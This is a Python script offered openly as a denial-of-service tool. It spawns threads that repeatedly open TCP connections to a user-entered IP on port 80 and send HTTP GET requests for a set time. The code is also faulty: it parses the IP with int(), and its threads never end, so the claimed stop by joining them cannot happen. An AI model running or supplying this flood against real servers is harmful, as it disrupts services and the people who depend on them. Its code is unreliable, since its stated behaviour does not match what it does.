import threading
import time
import socket
 
def dos_attack(target_ip: str, thread_count: int, attack_time: int):
    """
    Perform a Denial of Service (DoS) attack on a target IP address.
 
    Parameters:
    - target_ip: str
        The IP address of the target machine to be attacked.
    - thread_count: int
        The number of threads to be used for the attack.
    - attack_time: int
        The duration of the attack in seconds.
 
    Raises:
    - ValueError:
        Raises an error if the thread count or attack time is less than or equal to zero.
 
    Returns:
    - None
    """
 
    # Validating the thread count and attack time
    if thread_count <= 0:
        raise ValueError("Thread count should be greater than zero.")
    if attack_time <= 0:
        raise ValueError("Attack time should be greater than zero.")
 
    # Function to send a single packet to the target IP
    def send_packet():
        while True:
            try:
                # Creating a socket object
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
                # Connecting to the target IP
                s.connect((target_ip, 80))
 
                # Sending a dummy packet
                s.send(b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n')
 
                # Closing the socket
                s.close()
            except:
                pass
 
    # Start the attack by creating and starting the threads
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=send_packet)
        t.start()
        threads.append(t)
 
    # Sleep for the attack duration
    time.sleep(attack_time)
 
    # Stop the attack by joining all the threads
    for t in threads:
        t.join()
 
# Example usage of the dos_attack function:
 
try:
    target_ip = int(input( "enter ip : "))
    thread_count = int(input( "enter thread : "))
    attack_time = int(input( "enter time : "))
 
    dos_attack(target_ip, thread_count, attack_time)
    print(f"DoS attack on {target_ip} with {thread_count} threads for {attack_time} seconds completed.")
except ValueError as e:
    print(f"Error: {e}")
